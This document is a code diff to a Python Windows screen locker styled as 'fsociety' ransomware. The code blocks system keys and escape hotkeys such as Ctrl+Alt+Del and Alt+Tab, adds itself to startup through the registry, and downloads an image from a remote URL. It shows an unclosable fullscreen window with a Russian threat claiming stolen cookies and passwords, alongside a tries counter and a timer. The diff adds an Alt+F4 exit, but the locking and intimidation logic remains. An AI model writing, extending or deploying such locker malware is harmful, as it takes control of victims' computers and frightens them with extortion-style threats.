@@ -33,7 +33,7 @@ def lock():
     for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','delete','windows','left windows','right windows']:
         try: keyboard.block_key(k)
         except: pass
-    for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win+d','win+r','win+e','win+l','win+m','win+x','win+tab']:
+    for c in ['alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win+d','win+r','win+e','win+l','win+m','win+x','win+tab']:
         try: keyboard.add_hotkey(c, lambda:0, suppress=True)
         except: pass
 
@@ -88,11 +88,30 @@ def startup():
             winreg.CloseKey(r)
         except: pass
 
+def show_logo():
+    logo_path = os.path.join(tempfile.gettempdir(), "fsociety_logo.jpg")
+    if download_file(LOGO_URL, logo_path):
+        try:
+            lw = tk.Tk()
+            lw.attributes('-fullscreen', True); lw.attributes('-topmost', True)
+            lw.configure(bg='black'); lw.overrideredirect(True)
+            lw.protocol("WM_DELETE_WINDOW", lambda: None)
+            lw.bind("<Alt-F4>", lambda e: (lw.destroy(), sys.exit(0)))
+            img = tk.PhotoImage(file=logo_path)
+            if img.width() > 800:
+                img = img.subsample(max(1, img.width()//400), max(1, img.height()//400))
+            tk.Label(lw, image=img, bg='black').pack(expand=True)
+            lw.update()
+            time.sleep(4)
+            lw.destroy()
+        except: pass
+
 def anim_fsociety():
     a = tk.Tk()
     a.attributes('-fullscreen', True); a.attributes('-topmost', True)
     a.configure(bg='black'); a.overrideredirect(True)
     a.protocol("WM_DELETE_WINDOW", lambda: None)
+    a.bind("<Alt-F4>", lambda e: (a.destroy(), sys.exit(0)))
     lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 55, 'bold'))
     lbl.pack(expand=True)
     for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
@@ -106,23 +125,6 @@ def anim_fsociety():
     time.sleep(2.5)
     a.destroy()
 
-def show_logo():
-    logo_path = os.path.join(tempfile.gettempdir(), "fsociety_logo.jpg")
-    if download_file(LOGO_URL, logo_path):
-        try:
-            lw = tk.Tk()
-            lw.attributes('-fullscreen', True); lw.attributes('-topmost', True)
-            lw.configure(bg='black'); lw.overrideredirect(True)
-            lw.protocol("WM_DELETE_WINDOW", lambda: None)
-            img = tk.PhotoImage(file=logo_path)
-            if img.width() > 800:
-                img = img.subsample(max(1, img.width()//400), max(1, img.height()//400))
-            tk.Label(lw, image=img, bg='black').pack(expand=True)
-            lw.update()
-            time.sleep(5)
-            lw.destroy()
-        except: pass
-
 class Locker:
     def __init__(self):
         global tries
@@ -131,8 +133,7 @@ class Locker:
         self.w.attributes('-fullscreen', True); self.w.attributes('-topmost', True)
         self.w.configure(bg='black'); self.w.overrideredirect(True)
         self.w.protocol("WM_DELETE_WINDOW", lambda:None)
-        self.w.bind("<Alt-F4>", lambda e:None)
-        self.w.bind("<Escape>", lambda e:None)
+        self.w.bind("<Alt-F4>", lambda e: self.safe_exit())
         self.w.focus_force()
         
         self.end = timer_get()
@@ -151,7 +152,8 @@ class Locker:
                f"Я везде. Я в твоём роутере.\nЯ знаю все твои данные.\n"
                f"У меня есть cookies файлы,\nпароли, логины, почты и т.д.\n\n"
                f"МЫ FSOCIETY.\nYOU FUCK.\n\n"
-               f"ПОПЫТОК: {TRIES}\nТАЙМЕР: {HOURS} ЧАС")
+               f"ПОПЫТОК: {TRIES}\nТАЙМЕР: {HOURS} ЧАС\n"
+               f"\nAlt+F4 = ВЫХОД")
         
         tk.Label(self.w, text=msg, bg='black', fg='white', font=('Courier', 11, 'bold'), justify='center').place(relx=0.5, rely=0.58, anchor='center')
         
@@ -176,6 +178,11 @@ class Locker:
     def focus(self):
         try: self.w.focus_force(); self.e.focus_force(); self.w.after(100, self.focus)
         except: pass
+    
+    def safe_exit(self):
+        unlock()
+        self.r.destroy()
+        os._exit(0)
     
     def chk(self, e=None):
         global tries
@@ -205,8 +212,8 @@ if __name__ == "__main__":
         threading.Thread(target=kill, daemon=True).start()
         threading.Thread(target=timer_check, daemon=True).start()
         startup()
-        anim_fsociety()
         show_logo()
+        anim_fsociety()
         lock()
         Locker()
         tk.mainloop()
